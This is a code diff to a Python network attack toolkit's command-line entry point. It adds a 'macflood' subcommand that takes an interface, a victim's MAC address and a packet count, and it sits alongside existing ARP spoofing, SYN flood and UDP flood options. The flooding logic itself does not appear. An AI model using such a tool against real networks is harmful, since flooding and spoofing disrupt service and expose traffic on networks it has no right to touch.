@@ -121,14 +121,38 @@ def main():  # pylint: disable=R0915,R0912
         "--desc", help="Print attack description", action="store_true"
     )
 
+    # The MAC flood subparser
+    parser_macflood = subparser.add_parser(
+        "macflood", help="The MAC flood attack"
+    )
+    parser_macflood.add_argument(
+        "-i",
+        "--iface",
+        help="Your network interface (i.e. wlp2s0)",
+    )
+    parser_macflood.add_argument(
+        "-vm",
+        "--victmac",
+        help="The victim's MAC address",
+    )
+    parser_macflood.add_argument(
+        "-c",
+        "--count",
+        "-c",
+        help="Number of packets. Default 9223372036854775807",
+    )
+    parser_macflood.add_argument(
+        "--desc", help="Print attack description", action="store_true"
+    )
+
     args = parser.parse_args()
 
-    format_str = "[ %(funcName)s() ] %(message)s"
+    format_str = "%(levelname)s [ %(funcName)s() ] %(message)s"
 
     if args.debug:
         logging.basicConfig(format=format_str, level=logging.DEBUG)
     else:
-        logging.basicConfig(format=format_str)
+        logging.basicConfig(format=format_str, level=logging.INFO)
 
     if args.attack is None:
         parser.print_help()
@@ -158,7 +182,7 @@ def main():  # pylint: disable=R0915,R0912
                 arp_spoofer, args.gwmac, args.gwip, args.victmac, args.victip
             )
         except Exception as exc:
-            _LOGGER.error(exc)
+            _LOGGER.error(exc, exc_info=True)
             sys.exit(1)
 
     elif args.attack == "synflood":
@@ -174,7 +198,7 @@ def main():  # pylint: disable=R0915,R0912
                 sys.exit(0)
             syn_flooder.run()
         except Exception as exc:
-            _LOGGER.error("\n%s", exc)
+            _LOGGER.error("\n%s", exc, exc_info=True)
             sys.exit(1)
 
     elif args.attack == "udpflood":
@@ -190,7 +214,22 @@ def main():  # pylint: disable=R0915,R0912
                 sys.exit(0)
             udp_flooder.run()
         except Exception as exc:
-            _LOGGER.error("\n%s", exc)
+            _LOGGER.error("\n%s", exc, exc_info=True)
+            sys.exit(1)
+    elif args.attack == "macflood":
+        try:
+            mac_flooder = MACFlooder(  # noqa: F405
+                args.iface, args.victmac, args.count
+            )
+            if args.desc:
+                print(mac_flooder.description)
+                sys.exit(0)
+            if all((args.iface, args.victmac)) is False:
+                parser_macflood.print_help()
+                sys.exit(0)
+            mac_flooder.run()
+        except Exception as exc:
+            _LOGGER.error("\n%s", exc, exc_info=True)
             sys.exit(1)
 
 
